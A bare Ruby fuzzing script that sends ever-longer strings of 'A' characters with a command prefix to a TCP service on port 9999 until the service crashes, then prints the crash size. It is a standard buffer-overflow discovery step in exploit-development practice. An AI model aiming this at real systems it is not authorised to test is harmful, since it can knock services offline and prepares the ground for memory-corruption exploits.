#!/usr/bin/ruby
require 'socket'
require 'timeout'

target = ARGV[0]
command = ARGV[1]

m = 100
i = 1
buffer = "A"
crashed = false

while i < m  and not crashed do
  payload = buffer * 100 * i
  puts("Sending " + (payload.length.to_s) + " bytes...")
  begin
    Timeout.timeout(3) do
      s = TCPSocket.open(target, 9999)
      s.puts(command + " /.:/" + payload)
      s.recv(1024)
      s.close()
      i += 1
    end
  rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, Timeout::Error
    crashed = true
  end
end

if i < m
  puts("Crashed with " + (100 * i).to_s + " bytes.")
else
  puts("Service didn't crash.")
end
